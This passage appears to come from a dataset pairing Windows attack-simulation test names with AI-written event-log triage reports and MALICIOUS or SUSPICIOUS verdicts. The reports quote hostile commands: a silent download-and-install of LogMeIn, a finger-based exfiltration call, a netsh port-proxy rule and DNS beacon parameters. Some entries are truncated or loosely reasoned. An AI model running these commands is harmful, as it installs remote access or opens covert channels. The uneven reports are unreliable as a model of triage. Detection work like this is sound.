2. **Detailed Investigation**: Conduct a comprehensive forensic investigation of the identified host, including analysis of memory and disk for additional indicators of compromise.

DNS Large Query Volume,"**Detailed Analysis of Windows Event Logs:**

**1. Unusual PowerShell Activity:**
   - **Sysmon and PowerShell Logs:**
     - There are multiple invocations of PowerShell with a script that uses a loop to execute `Resolve-DnsName` for random TXT records (e.g., `""file-$(Get-Random ...).127.0.0.1.nip.io""`). This activity is often linked to domain generation algorithms (DGAs) used by malware or for penetration testing and reconnaissance purposes. It is commonly used for testing DNS resolution or creating noise.

**2. Elevated Privileges and Network Logon:**
   - **Security Logs:**
     - Events 4672 and 4624 show that `admin_test` has been logging on with elevated privileges. While `admin_test` appears to be a legitimate user, elevated actions can be a cause of concern depending on the pattern and the necessity of these activities.

**3. System and Application Executors:**
   - **Sysmon Logs:**
     - The `wevtutil.exe` and `conhost.exe` processes are executed frequently by `admin_test`. `wevtutil.exe` is used for reading and persisting event logs which may be normal for administrative tasks but can also be suspicious if patterns are irregular or excessive.
     
   - The presence of processes like `MicrosoftEdgeUpdate.exe` and various Edge installers indicate legitimate software updates, reducing the suspicion around other observed Microsoft Edge executables.

**4. Time Change Event:**
   - **System and Security Logs:**
     - There is an event where the system time was changed backwards, as indicated by Event ID 4616. While this can be benign in certain time synchronization events, it could also indicate an attempt to manipulate event logs.

**5. Misleading Events and Known Concerns:**
   - The presence of frequent Microsoft Edge updates and related processes (`MicrosoftEdgeUpdate.exe`) could be considered standard unless further analysis shows discrepancies in expected behavior or installations from untrusted sources.

**Assessment:**
- The PowerShell activity related to the DNS querying script appears anomalous and potentially malicious. Such scripts could be used for activities like testing network responses or making connections to unauthorized endpoints.
- The frequent execution of certain administrative tools could indicate normal operations or be overshadowed by potentially malicious activities if not authorized or expected.
- The time change, while sometimes normal, alongside the PowerShell activity increases suspicion.

**Guidance:**
- Immediate investigation should be prioritized on the PowerShell executions and ensure the execution of such scripts was intended and authorized.
- Verify the necessity and history of elevated privileges used by `admin_test`.
- Confirm the legitimacy of all frequent applications and network interactions occurring on the given host.

**Resolution:**  
**SUSPICIOUS** - These logs consist of activities that require further investigation to eliminate the possibility of malicious behavior, focusing especially on the PowerShell-related events and any unexpected elevated actions."
LogMeIn Files Detected Test on Windows,"**Detailed Analysis:**

1. **Windows Security Logs:**
   - Event ID 4672: Shows that the user `admin_test` was assigned special privileges. The list includes high-level privileges such as `SeDebugPrivilege`, which can be abused for malicious purposes. 
   - Event ID 4624: Indicates a successful logon by the same user `admin_test` from `DESKTOP-3HL5B2P` with the NTLM authentication package, which is common for network logons.

2. **Windows PowerShell Logs:**
   - Multiple events show a PowerShell session executed the following command:
     ```
     Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\LogMeInIgnition.msi https://secure.logmein.com/LogMeInIgnition.msi
     Start-Process -Wait $file1 /quiet;
     Start-Process 'C:\Program Files (x86)\LogMeIn Ignition\LMIIgnition.exe' ""/S""
     ```
   - This indicates that a remote access tool (LogMeIn) was downloaded and installed silently, which could be indicative of a malicious actor installing remote access software without user consent.

3. **Application Logs:**
   - MsiInstaller events confirm the installation of `LogMeIn Client`. The installation procedures align with the PowerShell activity.

4. **System Logs:**
   - Event ID 7040 shows that the service `WebClient` was changed from `demand start` to `auto start`. This could suggest a persistence technique to ensure the service starts at boot.

5. **Sysmon Logs:**
   - Multiple Sysmon events detail the process creation involved with LogMeIn, but there are no direct indicators of compromise originating from these events, other than confirming PowerShell and MsiInstaller logs.

**Assessment:**

The installation of LogMeIn using PowerShell commands combined with the elevation of privileges for `admin_test` user raises strong suspicion of unauthorized remote access being set up.

**Resolution:**

- **MALICIOUS**: The activity observed points toward the unauthorized installation of LogMeIn for potentially malicious purposes, especially when combined with elevated privileges and executed PowerShell scripts to download and install the software without user intervention.

**Guidance:**

1. Confirm whether the `LogMeIn Ignition` installation was authorized by checking with the `admin_test` user.
2. If unauthorized, immediately uninstall LogMeIn, and investigate any unauthorized access that may have occurred.
3. Change credentials associated with the `admin_test` account and monitor for further suspicious activity.
4. Review and tighten remote access and PowerShell execution policies on the network."
Splashtop Execution,"Upon reviewing the provided logs, several events indicate both legitimate and potentially suspicious activities.

This preliminary assessment serves as a base for further comprehensive investigation if Splashtop's usage is unauthorized."
DNS Regular Beaconing,"## Analysis:

### Suspicious Indicators:
1. **PowerShell Activity**:
   - The execution of `powershell.exe` with a script named `data-dns-beacon.ps1` is highly suspicious. The use of PowerShell to execute scripts from a temporary directory with terms like ""beacon"" generally suggests potential command and control (C2) activity, which is often seen in malware operations.
   - Parameters such as `-Domain 127.0.0.1.nip.io -Subdomain file -QueryType TXT -C2Interval 30 -C2Jitter 20 -RunTime 30` are indicative of DNS-based communication to potentially exfiltrate data or as a C2 beaconing mechanism.

2. **System and Security Logs**:
   - Frequent timestamp changes as seen in the security logs (Event ID 4616) are irregular and could indicate attempts to cover tracks or manipulate logs. Especially since `svchost.exe` is a legitimate process and may be used as a cover for malicious activities.

3. **Sysmon Logs**:
   - The execution of numerous instances of `whoami.exe`, `conhost.exe`, and other utilities like `wevtutil.exe` is notable if they are being excessively or unexpectedly invoked, but in themselves, do not necessarily imply malicious activity unless correlated with other evidence.
   - Presence of `whoami.exe` is often used by attackers post-compromise to gather information on the current user’s context.

### Malicious Activity Justification:
- The series of interactions using PowerShell (`data-dns-beacon.ps1`) suggests malicious intent due to its common use as part of a malware toolkit.
- The adjustments in the system's time coupled with the execution of potential information-gathering binaries suggest attempts at evasion or reconnaissance.
- Together, the coordinated execution of a known potentially malicious script, odd PowerShell operations, coupled with system and service manipulation attempts strongly indicate compromise.

## Assessment:
- **Resolution: MALICIOUS**
  - The activities captured in the logs demonstrate patterns typical of a compromised system, particularly the PowerShell execution of a DNS beacon script which can be part of a larger attack involving command and control activities. This is supported by abnormal system behavior adjustments, and potential attempts at covering tracks through time adjustment and frequent use of system utilities that might have been combined with these activities.

## Guidance on How to Proceed:
1. **Immediate Isolation**: 
   - Disconnect 'Server002' from the network to prevent potential data exfiltration or lateral movement within the network.
  
2. **Further Investigation**:
   - Perform a detailed forensic analysis on the affected system to identify all potentially compromised components and gather evidence of malicious activity.
   - Consider the context of `data-dns-beacon.ps1`: determine its origin, potential payload, and its network interactions.
   - Check for additional indicators of compromise on surrounding systems in the network that might also be affected.

3. **Remediation**:
   - Remove and replace infected files and restore the system to a secure state, preferably from a known-good backup.
   - Apply security updates and patches to prevent reinfection or exploit by similar techniques.

4. **Monitoring & Review**:
   - Implement enhanced monitoring policies to detect such anomalies early, utilizing updated intrusion detection systems and continuous log analysis.

Curl Download File,"## Analysis of Windows Event Logs

Upon analyzing the provided event logs from the Windows host designated as ""Server002,"" several patterns and activities can be observed. The primary goal is to identify any potential indicators of malicious activities.

### Observations

1. **Application Logs**:
   - The application log entries predominantly involve the Software Protection Platform Service and the edgeupdate service. The stopping of the edgeupdate service is not inherently suspicious; it is likely part of routine operations when updates are completed.

2. **Security Logs**:
   - Event ID 4616 indicates a change in system time with no apparent errors. Although time manipulation can be indicative of compromise, this alone, without correlating suspicious activities, isn't necessarily alarming.

3. **Sysmon Logs**:
   - Numerous Sysmon Event ID 5 and Event ID 1 entries are seen, indicating process creations and the loading of executable files.
   - A notable entry is a cmd.exe process running with a command line involving `curl.exe` to download a file from GitHub: `AllTheThingsx64.dll`. This DLL is downloaded into multiple directories, which can be highly suspicious, especially as it's being executed through `cmd.exe`.
   - Multiple invocations of `curl.exe` with high integrity level permissions by the user `SERVER002\admin_test` to fetch a .dll file suggest downloading of potentially unauthorized or malicious software.
   - Events related to ordinary administrative tasks such as `whoami.exe` and `hostname.exe` have been initiated but can be paired with the same parent processes as those fetching external resources.

4. **General Observations**:
   - The use of `curl.exe` in automated scripts or commands to download binary files from external, potentially untrusted URLs is a common tactic for malware delivery.
   - The rapid and automated sequence of downloading the same DLL multiple times can indicate an attempt to smuggle unauthorized files onto the system without detection.
   - Sysmon logs show highly repetitive and automated behavior, without clear traces of legitimate administrative tasks being part of standard operations.

### Conclusion

Based on the analysis of the logs, the detection of `cmd.exe` commands initiating `curl.exe` to download a file from an external source across multiple paths and directories is a clear indication of potentially malicious behavior. In a typical secure environment, such patterns of downloading from personal GitHub repositories would likely be flagged due to their association with malware deployment techniques, especially when performed in an automated manner.

Nimgrab - Transfer Files,"Upon carefully analyzing the provided Sysmon logs for the Windows host, there are several key observations and points of concern that stand out, which suggest potentially suspicious activity:

1. **Repeated Use of `wevtutil.exe` and `conhost.exe`:**
   - There are multiple executions of `wevtutil.exe` (EventRecordIDs 18003, 18007, 18015, 18019) and `conhost.exe` (EventRecordIDs 18000, 18005, 18012, 18020). While these binaries are legitimate Windows processes, repeated invocation in close succession may suggest attempts to clear event logs (`wevtutil.exe`) or heavy use of console sessions.
   
2. **Execution of PowerShell and Command Prompts:**
   - The logs show `powershell.exe` execution as well as command prompt (`cmd.exe`) executions (EventRecordID 18029, 18031) with potentially unusual command-line arguments. Specifically, `cmd.exe` is used to execute a script or file called `nimgrab.exe` downloaded from an external URL, which could indicate an attempt to download and execute a potential malicious script or tool.
   - The download of a script or license file via PowerShell/CMD from an external source is a common tactic seen in malware attacks.

3. **Elevated Execution Context:**
   - The processes were executed with a high integrity level, indicating that they have elevated privileges. Executing potentially malicious actions with elevated privileges increases the risk to the system.

4. **User Context:**
   - All suspicious activities were executed under the user `SERVER002\admin_test`, highlighting possible misuse or compromise of an administrative account.

Given these observations, especially the pattern of behavior involving downloading and executing files from external sources, the elevated privileges, and repeated attempts to access or clear logs potentially related to covering tracks, the activities described in the logs appear to exhibit clear malicious characteristics.

**Resolution: MALICIOUS**

### Recommendations:
- **Immediate Containment:** Disable the `admin_test` account to prevent further misuse.
- **Investigate `nimgrab.exe`:** Analyze the downloaded files for malicious code using tools such as VirusTotal, sandboxes, or reverse engineering.
- **Review Security Logs:** Though not available in this excerpt, reviewing additional security logs might provide more context regarding the initial access vector.
- **Perform System Scan:** Utilize endpoint detection and response tools to scan for other unauthorized or malicious activities across the host and network.
- **Patch Known Vulnerabilities:** Ensure all critical vulnerabilities are patched to prevent exploitation of known flaws.
- **User Awareness:** Provide security awareness training to users, emphasizing the dangers of downloading and executing unfamiliar software.
- **Consider a Full Incident Response:** Given the severity, an in-depth incident response might be necessary to ensure all aspects of the potential compromise are identified and remediated."
File download with finger.exe on Windows,"Upon reviewing the provided logs, various types of Windows event logs including Security, Sysmon, System, and Application logs have been analyzed. Below is a breakdown of notable activities observed:

### Security Log Analysis:
1. **Event ID 4634**: Indicates a logoff event where the user `admin_test` logged off. This is a standard event and doesn't raise any concern.
2. **Event ID 4624/4672**: Multiple logon events using NTLM authentication for the user `admin_test`, with LogonType 3 (network logon) and elevated privileges including `SeDebugPrivilege`. While LogonType 3 is common for network logons, the presence of privileges like `SeDebugPrivilege` is generally associated with high privileges and potentially unregulated access. This can be concerning especially if not typical for this user.

### Sysmon Log Analysis:
1. Execution of **`wevtutil.exe`** and **`conhost.exe`** by `admin_test` is observed multiple times. While these commands are part of normal Windows operations, frequent triggering could be suspicious if it isn’t part of scheduled administration tasks.
2. Execution of **`cmd.exe`** with command-line usage of `finger base64_filedata@localhost`. Using the `finger` command could be anomalous as it's not commonly used and may indicate attempts at information gathering or covert communication.
3. **`whoami.exe`** and **`HOSTNAME.EXE`** executions are benign commands used to gather user and system information, but their frequency and correlation to other potentially suspicious activities should be noted.

### System Log Analysis:
- No unusual activities. Standard time synchronizations and timezone adjustments were recorded, which are typical operations on a Windows server maintaining time integrity.

### Application Log Analysis:
- Multiple entries related to Microsoft Edge Update. These appear related to regular system update checks or executions, which, unless accompanied by unscheduled system or network changes, are typically benign.

### Summary:
- **Elevated Privileges**: The user `admin_test` has been operating with substantial privileges repeatedly in a short time frame, while executing system utilities and network-related commands, which might not be typical behavior.
- **Anomalous Command Usage**: The `finger` command with what might be a data field (base64_filedata) could indicate a possible attempt at data exfiltration, information gathering, or testing.

### Resolution:
- **Resolution**: **SUSPICIOUS**
- **Guidance**: There are indicators that suggest further investigation is necessary, particularly regarding the activities of the user account `admin_test` with elevated privileges and potentially uncommon command usage. Verify whether the user actions align with their standard duties or authorized activities, examine network traffic for anomalies relating to the `finger` command usage, and consider system-wide searches for any unauthorized scripts or tools. Maintaining logs of any unusual privilege use or command-line execution on critical servers is recommended."
Steganographic Tarball Embedding,"**Detailed Analysis of Windows Event Logs:**

Upon reviewing the provided Windows event logs, a few points merit consideration:

1. **Frequent Process Executions:**
   - Multiple executions of the Microsoft Edge installer (`setup.exe`) are documented. While not inherently malicious, frequent executions could imply automated tasks like updates or installation scripts, especially running at the System level.

2. **PowerShell Activity:**
   - Several PowerShell commands are executed by the `admin_test` user. An important command reads and writes binary-encoded files (`Get-Content` and `Set-Content`), which can be benign under certain contexts but suspicious if it’s writing to URLs or unusual directories. The command in question targets JPEG files and an unconventional .tarz file.

3. **High-Integrity Level for PowerShell:**
   - The PowerShell process runs with a High-integrity level, allowing it significant privileges, indicative of a user session with elevated privileges.

4. **Use of System Utilities:**
   - `wevtutil.exe` and `whoami.exe` are executed. While `whoami.exe` is typically used for legitimate administrative purposes to confirm user identity, multiple `wevtutil.exe` executions, often in close succession, may suggest an attempt to manage or query event logs.

5. **User Context and Integrity Levels:**
   - The logs mainly involve processes running as `NT AUTHORITY\SYSTEM` or `SERVER002\admin_test` with System or High integrity levels, indicating actions executed with administrative privileges.

**Assessment:**

- **PowerShell Usage:** The PowerShell command involves binary file manipulation, which is atypical for standard scripting, raising suspicion. Such usage patterns could indicate data exfiltration or manipulation efforts.
- **Installation/Update Activity:** Multiple `setup.exe` executions could reflect common update processes. However, without additional context on scheduled tasks or update policies, these need attention for verification.
- **Utility Executions (wevtutil.exe and conhost.exe):** The repeated use may either be benign exploratory commands or attempts to alter log evidence, necessitating further inspection for confirmation.

**Threats or Risks Identified:**

- The suspicious PowerShell activity, combined with elevated privileges, could pose a risk for unauthorized data manipulation or exfiltration.

**Guidance for Proceeding:**

1. **Gather Context on Scheduled Tasks:** Verify company policies on automated updates to understand if frequent executions of `setup.exe` for Edge updates align with normal operations.
   
2. **Review PowerShell Command Sources:** Investigate scripts or tasks triggering the PowerShell commands, specifically those handling binary data, and ensure they are authorized.

3. **Audit Recent Administrative Actions:** Determine the legitimacy of the executed administrative commands and any correlating tasks in the system, especially those related to `wevtutil.exe`.

4. **Increase Monitoring:** Implement additional logging and alerting for similar activities in the future. Consider setting alerts for high-frequency PowerShell activity with similar command patterns.

**Resolution:**

- **SUSPICIOUS**: Certain activities, especially the PowerShell commands, warrant further investigation to rule out potential security breaches."
MAZE Propagation Script,"Upon reviewing the provided Windows event logs, I identified several events and behaviors of interest that could indicate suspicious or potentially malicious activity:

### Suspicious Findings:

1. **PowerShell Execution:**
   - There are multiple entries related to the execution of PowerShell scripts. The command involves a PowerShell script running from the temporary directory, which is often used for malicious activities due to its write permissions.
   - The script retrieves machine names from a file and tries to execute further commands on them using Windows Management Instrumentation Command-line (WMIC). It also uses `regsvr32.exe`, which is known for being misused for malicious purposes due to its ability to run DLL files.

2. **Command Execution from PowerShell:**
   - The command explicitly copies the command prompt (`cmd.exe`) to other machines and creates processes remotely using `wmic`. This behavior is particularly suspicious as legitimate administrative scripts usually use more direct and less convoluted methods for administration. 

3. **File Paths and Operations:**
   - The paths such as `C:\Users\ADMIN_~1\AppData\Local\Temp\file\..` are indicative of operations leveraging temporary file storage to potentially prepare for executing further malicious actions.
   - The creation of executable files like `data.exe` on remote systems and the use of `regsvr32.exe` for registration indicates possible attempts to execute unwanted software or malware.

### Analysis:

- The processes observed, involving PowerShell, `cmd.exe`, and `regsvr32.exe`, follow typical patterns of malicious activities where attackers use scripting for automated exploitation and system compromise.
- The execution context (`SERVER002\\admin_test`) with High Integrity Level suggests elevated privileges, which, if compromised, could lead to severe security breaches.
  
### Conclusion:

Based on the evidence of PowerShell execution with highly suspect command lines, and usage of known techniques and tools that attackers often exploit in malicious operations, I conclude the resolution of this log investigation as:

**MALICIOUS**

### Recommendations:

1. **Immediate Response:**
   - Isolate the affected machine (`Server002`) from the network to prevent further spread or damage.
   - Alert relevant security teams to conduct an in-depth investigation and response.

2. **Further Actions:**
   - Investigate the source and intent of the PowerShell commands and if any files (e.g., `data.exe`) are present on the machine or others within the network.
   - Scan the network for lateral movement activities or further compromised systems.
   - Review and strengthen PowerShell execution policies to restrict unauthorized or unsigned scripts.
   - Conduct a comprehensive threat hunting exercise to determine potential compromise vectors and system vulnerabilities exploited.

3. **Long-term Measures:**
   - Consider implementing application whitelisting and enhancing logging and monitoring on critical systems.
   - Review and, if necessary, enhance the organization’s incident response plan to ensure quick detection and mitigation in future incidents."
Arbitrary file download using the Notepad++ GUP.exe binary,"### Detailed Analysis

The logs provided cover several different Windows events, particularly focused on Sysmon logs, which offer insights into process creations, file modifications, and events that might represent a security concern. Here's a breakdown of the analysis:

#### **Analysis of Sysmon Events**

1. **Microsoft Edge Update Activities**:
   - Several entries show processes related to ""MicrosoftEdgeUpdate.exe"" and similar variants being executed:
     - Such activities are typically indicative of legitimate software update checks or installations.
     - The command lines provided, such as `""MicrosoftEdgeUpdate.exe"" /update` and similar invocations, align with standard software update behavior.
     - Occurrences of Microsoft-related signatures and file paths (e.g., Microsoft Corporation, Program Files path) suggest these activities are benign.

2. **Shell and Utility Executions**:
   - Instances of standard Windows command-line utilities and shell tasks, such as `cmd.exe`, `whoami.exe`, `HOSTNAME.EXE`, `conhost.exe`, are logged:
     - These might indicate a user session or administrative task being executed. For example, `whoami.exe` and `HOSTNAME.EXE` are standard tools for retrieving system information.
     - Execution of `cmd.exe` with commands such as `mkdir ""c:\\Temp""` and downloading from external links with GUP (a utility associated with Notepad++) appears slightly suspicious as this could be leveraged for downloading malicious payloads.
     - This actual download was targeted at a benign-appearing site getsamplefiles.com which might indicate further scrutiny.

3. **Administrator Activity**:
   - There is significant logging of processes under the user ""SERVER002\\admin_test"":
     - The execution of normally safe system processes under an admin account can warrant considerations for further review if these processes align with typical usage or if they show unexpected behavior.
     - Opening of several command-line related processes shortly after each other by `admin_test` without further context could be seen as unusual but not conclusively malicious.

4. **`wevtutil.exe` and `sppsvc.exe`**:
   - Appearances of `wevtutil.exe` are routine as it involves operations with event logs. Frequent use can be regular maintenance but could also indicate attempts to evade detection by tampering with logs.
   - `sppsvc.exe` (Software Protection Platform service) logs might relate to licensing operations. Their presence does not immediately indicate malicious activity without supporting evidence.

#### **Suspicious Process Details**
- **GUP.exe Download Activity**: 
   - The download and usage of `GUP.exe` to unzip a file from what appears to be an external source for Notepad++ updates, while executed by an admin user, could be an avenue for downloading other files under the guise of an update. 
   - This operation stands out due to the external network interaction and requires verification of the source and purpose.

### Overall Threat Assessment

- **BENIGN**: 
  - The majority of the log activities, particularly those related to Microsoft Edge updates, show legitimate activity pattern consistent with software updates. They have no indicators of compromise.
- **SUSPICIOUS**:
  - The chain of commands involving external downloads and the execution of command prompts via `admin_test` requires further analysis, especially understanding the intent and verification of the source.

### Resolution

Based on the analysis, the situation can be consolidated into a **SUSPICIOUS** resolution. The majority of entries appear standard for a Windows environment with legitimate processes, but the unexpected execution pattern involving downloads using `GUP.exe` and frequent command-line invocations from the `admin_test` account flags potential concern warranting further review.

### Next Steps

- **Investigation**: Conduct an in-depth examination of the `GUP.exe` activity and other associated downloads, confirming the legitimacy of the downloads and ensuring data integrity.
- **User Activity Monitoring**: Review user activity on the `SERVER002\\admin_test` account to establish a baseline of normal behavior and identify potential deviations.
- **Network Analysis**: Explore network traffic logs corresponding to these timestamps to ensure no unauthorized data exfiltration or command-and-control communication.
"
ScreenConnect Application Download and Install on Windows,"Upon reviewing the provided Windows event logs, I have identified several key findings and the potential implications of these events, which may suggest suspicious or malicious activity:

### Key Findings:

1. **Installation of ScreenConnect.msi:**
   - The Application and Sysmon logs show the installation of `ScreenConnect.msi` via `msiexec.exe` with a command executed from PowerShell. The command used PowerShell to download the MSI file from a remote URL using `Invoke-WebRequest` and then install it silently using `msiexec /i /qn`.
   - **Suspicion Factors:**
     - The PowerShell command is crafted to download and execute an MSI installer from an external source (`https://d1kuyuqowve5id.cloudfront.net`), which is not typical for legitimate administrative behavior without explicit consent.
     - The use of PowerShell and silent installation flags (`/qn`) can be indicative of an attempt to perform activities without user notification.

2. **High Integrity Level Processes:**
   - Processes such as PowerShell and `msiexec.exe` are executed with a high integrity level, indicating they were run with administrative privileges. This level of access is typically required for system changes, which could potentially be abused for malicious purposes.

3. **Enumeration Activities:**
   - Execution of built-in tools like `hostname.exe` and `whoami.exe`, which are seen in the Sysmon logs. While these are legitimate binaries, they can be used by attackers to enumerate system information to understand the environment better.

4. **Time Synchronization:**
   - The Security and System logs show a series of time change events that indicate unusual system time adjustments. This could be benign or related to masquerading activities by threat actors attempting to adjust the timeline of their actions.

### Assessment and Conclusion:

- **BENIGN**: The activity involving the installation of `ScreenConnect.msi` could be legitimate if authorized by the system administrator for remote support purposes, provided the URL and software source are verified as safe and known.
  
- **SUSPICIOUS**: Given the use of PowerShell to facilitate a download from an unverified URL, combined with the silent installation and high integrity level execution, there is cause for suspicion. The enumerative use of `hostname.exe` and `whoami.exe` further increases suspicion of the legitimacy of the operation without appropriate context.
  
- **MALICIOUS**: If the download URL or the `ScreenConnect` installation was not sanctioned or expected, this action could be deemed malicious, potentially indicating a compromise or unauthorized remote control installation attempt by an attacker.

### Recommendation:

Given the information and in the absence of certainty about the legitimacy of the `ScreenConnect` installation, I categorize this situation as **SUSPICIOUS**. Further investigation is warranted. Actions to take include:

1. **Verification of MSI Source**: Investigate the legitimacy of the `ScreenConnect.msi` download link and assess whether the installation was sanctioned by the IT department.
   
2. **Review User Activity**: Confirm with the user or system administrator for authorization and intent behind the installation process.
   
3. **Network and Endpoint Monitoring**: Increase monitoring on the host for any signs of remote access or unusual outbound network communications.

4. **System Integrity Check**: Perform a thorough system integrity check to detect any unauthorized changes and ensure no backdoors were installed during this activity.

Taking these steps will help determine if the suspicious activity leads to a potential compromise or validate it as benign administrative work."
Lolbas replace.exe use to copy file,"Upon reviewing the provided Windows event logs, here is a detailed analysis of the behaviors observed:

1. **PowerShell Execution (EventRecordID: 17989):**
   - A PowerShell instance was executed by the user ""SERVER002\admin_test"". PowerShell usage itself is not inherently suspicious, but it can be an indicator of malicious activity, particularly if used with encoded or obfuscated commands. Unfortunately, command-line arguments are not provided in this log, making it difficult to assess the intent.

2. **Frequent Execution of wevtutil and conhost Processes (EventRecordID: 17990-18024):**
   - The user ""SERVER002\admin_test"" executed `wevtutil.exe` and `conhost.exe` multiple times in rapid succession. `wevtutil` is a command-line utility for managing Windows Event logs, often used in legitimate scenarios for querying or manipulating event logs. However, repeated execution could indicate an attempt to clear logs to cover tracks.
   - The consistent launch of `conhost.exe` as a child process, paired alongside these executions, is expected behavior when command-line tools are run in a console session.

3. **Execution of HOSTNAME, WHOAMI, and CMD (EventRecordID: 18011, 18015, 18019):**
   - The `hostname.exe` and `whoami.exe` commands were executed. These are common utilities used to gather information about the system and logged-in user. In isolation, this could reflect routine administrative activities, but it may also be part of reconnaissance efforts by an attacker.
   - `cmd.exe` was used with a suspicious command line that includes `del` (delete) and `replace` commands targeting `.cab` files within a temporary directory. The use of these commands could indicate an attempt to modify or replace critical files, which can be suspicious if not associated with an expected update or administrative maintenance activity.

4. **Microsoft Edge Update Activity (EventRecordID: 18026-18028):**
   - Multiple instances of the Microsoft Edge Installer and related processes running as ""NT AUTHORITY\SYSTEM"" indicate an update operation, typical for software like browser updates. This process seems normal unless further correlated context or alerts indicate tampering or exploitation in the update mechanisms.

**Assessment:**
- **SUSPICIOUS**: The combination of PowerShell use, frequent `wevtutil` executions, and the manipulation of `.cab` files via command line commands raises some red flags. The presence of activities common in system administration tasks (such as `whoami` and `hostname`) combined with these processes might indicate early stages of a malicious operation or false positives from administrative tasks.

**Guidance:**
- Further investigation is required to confirm the intent behind these operations. It is crucial to:
   - Check if there is any known schedule or reason provided by IT administrators for these activities during the specified time.
   - Investigate further into the command line arguments used in the PowerShell and CMD events via a broader log scope or by contacting the responsible administrator/user.
   - Review other security systems or logs (IDS/IPS, Antivirus logs) for signs of exploitation, privilege misuse, or anomalous network traffic originating from the host to corroborate the findings."
portproxy reg key,"**Detailed Analysis:**

1. **PowerShell Logs:**
   - Multiple entries in the PowerShell logs show the execution of a PowerShell command with the following contents:
     ```
     powershell.exe & {netsh interface portproxy add v4tov4 listenport=1337 connectport=1337 connectaddress=127.0.0.1}
     ```
   - This command sets up a port proxy on the local machine, redirecting traffic from a listening port (1337) to a same port but could be targeting a potentially malicious purpose depending on further context or use case.
   - The use of PowerShell for such configurations without proper documentation or accompanying legitimate administrative tasks is often considered suspicious and can be leveraged for malicious purposes.

2. **Sysmon Logs:**
   - There are multiple execution events for system utilities such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and notably, `netsh.exe` executed with a command to add a port proxy, matching the PowerShell activity observed.
   - The consistent user across these logs is `SERVER002\admin_test`, indicating these operations might have been performed under an administrative privilege, raising concerns about potentially unauthorized use or credential abuse.

3. **Application Logs:**
   - The event regarding the Software Protection Platform Service (SPP) does not from the current data seem relevant to any suspicious activity and appears as routine.

4. **Security & System Logs:**
   - The provided data does not include entries in the security or system logs, which may limit full context understanding of changes in session events, policy adjustments, or network adapters which would have been insightful here.

**Assessment of the Situation:**
- The PowerShell and Sysmon logs point to the creation of a port proxy via `netsh`. The choice of port 1337, a commonly used number in hacker culture, can suggest non-standard intentions. The described action does not inherently confirm malicious activity without context, such as if it was set for remote management during a legitimate administrative task, however, in the absence of documentation it raises significant red flags.

**Identified Threats or Risks:**
- Potential unauthorized port forwarding which can be used to obscure traffic, enable lateral movement within a network, or exfiltrate data.
- Execution of processes under administrative accounts without clear justification can indicate credential misuse.

**Guidance on How to Proceed:**
- **Investigate further**:
  - Validate whether any legitimate administrative tasks were scheduled around the time of the logs.
  - Review user activity and access logs for `SERVER002\admin_test` to confirm the legitimacy of the actions.
  - Assess network traffic logs or firewall logs for any unusual patterns through port 1337.
  - Conduct a security audit of system configurations to ensure no further malicious adjustments have been made.

**Final Resolution:** 
- **SUSPICIOUS**: The observed activities are suspicious due to the nature of commands and tools involved, warranting further investigation to rule out any compromise."

RustDesk Files Detected Test on Windows,"### Detailed Analysis of the Logs:

#### System Logs:
- The system logs show routine operations primarily involving time zone changes and adjustments made by the Windows Time Service using `time.windows.com`. This behavior is generally benign and expected as part of normal Windows operations.

#### Security Logs:
- Multiple Event ID 4624 (Logon) and 4672 (Special Privileges Assigned to New Logon) indicate typical system activity using local SYSTEM accounts (`S-1-5-18`).
- The Event ID 5379 (Credential Manager operation failed) entries, which repeatedly attempt to access a Microsoft Account, may raise a flag for further scrutiny to understand why these credential operations failed. However, they may happen due to misconfiguration or network issues rather than malicious activities.

#### Application Logs:
- The Application logs indicate service stops from standard software components like `edgeupdate`.
- Windows Defender is noted to be active (""SECURITY_PRODUCT_STATE_ON""), which is a positive indicator of basic security posture maintenance.

#### Sysmon Logs:
- The Sysmon logs indicate a specific PowerShell activity where a file (`rustdesk-1.2.3-1-x86_64.exe`) is downloaded from an external source (GitHub). This is followed by its execution. This event stands out because it shows a download and execution of a potentially executable file which is typically a behavior seen in software installation.
- The specific use of PowerShell to script the download and execution of an application suggests increased risk and potentially malicious intent, especially in environments where such procedures are not standard practice. This particular process, originating from a user ""admin_test"", could avoid detection but remains aligned with potentially harmful activities if not previously sanctioned.
- Taskkill activity (with RuntimeBroker_rustdesk.exe) immediately following the RustDesk installation script may also be seen as an attempt to manipulate or prematurely terminate a process, which admittedly could be part of normal operations or installation procedures but again merits verification given the context.

### Assessment of the Situation:
The presence of PowerShell commands used to download and execute files from the internet is unconventional and could indicate a vulnerability in security practices. It highlights potential misuse or unauthorized installation unless pre-approved in a controlled part of operations.

### Identified Threats or Risks:
- Scripted PowerShell downloads of executable files can be exploited by malicious entities to deploy unauthorized software.
- Any unauthorized installation may introduce malware or backdoors into the system.

### Guidance on How to Proceed:

2. **Inspect Security Policies**: Review security policies regarding executable downloads via script to ensure compliance and prevent such actions without explicit administrative oversight.
3. **Monitor the ""admin_test"" user**: Investigate the `admin_test` account for anomalies or signs of compromise.
4. **Network Integrity Check**: Determine any unusual outgoing traffic related to the IP addresses at the time of these activities.
5. **Enhance Security Measures**: Implement additional monitoring solutions or alerts for PowerShell activities executing external commands.

### Conclusion:
Based on the specific PowerShell activity that features external executable download and execution, the logs appear suspicious and require further investigation.

### Resolution:
- **SUSPICIOUS** - Given the PowerShell activity related to downloading and executing software, it necessitates further examination and validation against legitimate usage policies.
"
Embedded Script in Image Execution via Extract-Invoke-PSImage,"Upon analyzing the provided logs from the Windows host ""Server002,"" the following observations and analysis can be made:

1. **Windows PowerShell Events**:
   - A series of PowerShell event logs (EventID: 600, 400, 403) show that a PowerShell script is executing various commands.
   - The script involves executing `Extract-Invoke-PSImage` to decode potentially malicious base64 content from `evil_kitten.jpg`.
   - The decoded script is inferred to perform further activities via `textExtraction.ps1`.

2. **Sysmon Events**:
   - EventID 1 and 5 show multiple instances of PowerShell being executed with specific command lines related to the base64 extraction and further script execution from the image file.
   - Several processes such as `whoami.exe`, `wevtutil.exe`, `conhost.exe`, and `hostname.exe` are involved, indicating enumeration and event log manipulation activities.

3. **Indications of Potential Malicious Activity**:
   - The use of an image file `evil_kitten.jpg` to embed and execute a script is a well-known obfuscation and attack technique in malware operations (often referred to as steganography).
   - The decoding of base64 content and extraction and execution of scripts that are not visible in the logs suggest malicious intent.
   - The utilization of PowerShell for these tasks alongside the lack of apparent administrative oversight or justification signals unauthorized usage likely for compromise purposes.

